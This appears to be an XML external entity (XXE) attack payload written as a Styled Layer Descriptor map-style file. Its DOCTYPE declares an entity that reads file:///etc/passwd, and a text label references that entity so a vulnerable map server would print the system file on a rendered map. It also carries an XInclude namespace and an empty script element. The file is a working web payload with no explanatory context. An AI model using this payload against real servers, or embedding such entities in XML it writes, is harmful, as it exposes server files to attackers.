<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY blah SYSTEM "file:///etc/passwd"> ]>
<StyledLayerDescriptor version="1.0.0" xmlns:xi="http://www.w3.org/2001/XInclude">
<script/>
<NamedLayer>
<Name>cities</Name>
<UserStyle>
<Title>xxx</Title>
<FeatureTypeStyle>
<Rule>
<TextSymbolizer>
<Geometry>
<PropertyName>atLocation</PropertyName>
</Geometry>
<Label>&blah;</Label>
<Font>
<CssParameter name="font-family">times</CssParameter>
<CssParameter name="font-style">italic</CssParameter>
<CssParameter name="font-weight">bold</CssParameter>
<CssParameter name="font-size">6</CssParameter>
</Font>
<Fill>
<CssParameter name="fill">#FF0000</CssParameter>
</Fill>
<LabelPlacement>
<PointPlacement>
<AnchorPoint>
<AnchorPointX>0.5</AnchorPointX>
<AnchorPointY>0.5</AnchorPointY>
</AnchorPoint>
<Displacement>
<DisplacementX>20</DisplacementX>
<DisplacementY>10</DisplacementY>
</Displacement>
<Rotation>20</Rotation>
</PointPlacement>
</LabelPlacement>
<Halo/>
</TextSymbolizer>
</Rule>
</FeatureTypeStyle>
</UserStyle>
</NamedLayer>
</StyledLayerDescriptor>
